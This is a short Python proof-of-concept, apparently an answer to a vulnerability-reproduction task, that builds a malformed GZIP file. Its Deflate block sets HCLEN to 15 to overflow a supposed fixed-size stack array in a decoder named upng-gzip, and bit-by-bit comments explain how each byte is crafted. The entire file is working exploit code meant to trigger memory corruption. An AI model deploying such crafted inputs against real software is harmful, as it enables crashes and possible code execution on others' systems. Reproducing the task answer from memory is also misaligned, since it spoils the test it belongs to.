import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in upng-gzip.
        
        The vulnerability exists because the application allocates a fixed-size array 
        (likely size 15) for the Huffman code length alphabet, but the Deflate specification 
        allows for up to 19 code lengths (HCLEN=15). By providing a GZIP stream with 
        HCLEN=15, we force the decoder to write 19 entries, overflowing the stack buffer.
        """
        
        # Minimal GZIP header
        # Magic (1F 8B), Compression Method 8 (Deflate), Flags 0, MTime 0, XFL 0, OS 3 (Unix)
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
        
        # Deflate Block Data
        # We construct a Dynamic Huffman block (BTYPE=2) with maximum HCLEN.
        #
        # Bit stream visualization (LSB first):
        # 1        : BFINAL = 1
        # 0 1      : BTYPE = 2 (Dynamic Huffman)
        # 00000    : HLIT = 0 (257 literal/length codes)
        # 00000    : HDIST = 0 (1 distance code)
        # 1111     : HCLEN = 15 (19 code lengths) - This triggers the overflow
        # ...      : Code lengths (3 bits each) for the code length alphabet
        
        # Byte 0:
        # Bits 0-7: 1 (FINAL) | 0 (TYPE0) | 1 (TYPE1) | 00000 (HLIT)
        # Binary: 00000101 -> 0x05
        b0 = b'\x05'
        
        # Byte 1:
        # Bits 0-4: 00000 (HDIST)
        # Bits 5-7: 111 (HCLEN bits 0-2)
        # Binary: 11100000 -> 0xE0
        b1 = b'\xe0'
        
        # Byte 2:
        # Bit 0: 1 (HCLEN bit 3)
        # Bits 1-7: 0000000 (First 2.3 code lengths, filled with 0)
        # Binary: 00000001 -> 0x01
        b2 = b'\x01'
        
        # Remaining payload:
        # We need to provide 19 * 3 = 57 bits for the code lengths.
        # We have supplied 7 bits of code length data in Byte 2 (bits 1-7).
        # We need 50 more bits.
        # 7 bytes * 8 bits/byte = 56 bits, which is sufficient.
        # The values don't matter for the overflow (just the count), so 0s are fine.
        payload_tail = b'\x00' * 7
        
        payload = b0 + b1 + b2 + payload_tail
        
        return header + payload